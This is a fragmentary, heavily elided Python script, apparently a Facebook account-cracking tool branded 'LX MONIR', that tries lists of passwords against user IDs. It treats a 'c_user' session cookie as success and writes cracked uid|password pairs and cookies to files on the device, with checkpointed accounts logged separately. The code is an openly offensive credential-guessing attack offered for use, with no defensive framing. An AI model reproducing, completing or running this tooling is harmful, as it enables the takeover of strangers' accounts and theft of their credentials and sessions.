#SC MAKED BY LX MONIR  🤣 and Fuked By FB-KING 🙄
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        ...
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mLX MONIR \033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            ...
            if 'c_user' in log_cookies:
                ...
                print(f"\033[38;5;46m[LX MONIR -OK💛] {uid}|{ps}")

                print(f" \n Cookie : {coki}")

                print(f" \n ══════════════════════════════════════════")

                open('/sdcard/LX MONIR /ok.txt', 'a').write( uid+' | '+ps+'\n')
                ...
                print(f"\x1b[38;5;196m[LX MONIR -CP🔒] {uid}|{ps}")

                open('/sdcard/LX MONIR -CP.txt', 'a').write( uid+' | '+ps+' \n')
        ...
        sys.stdout.write(f'\r\033[m[LX MONIR 💉] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
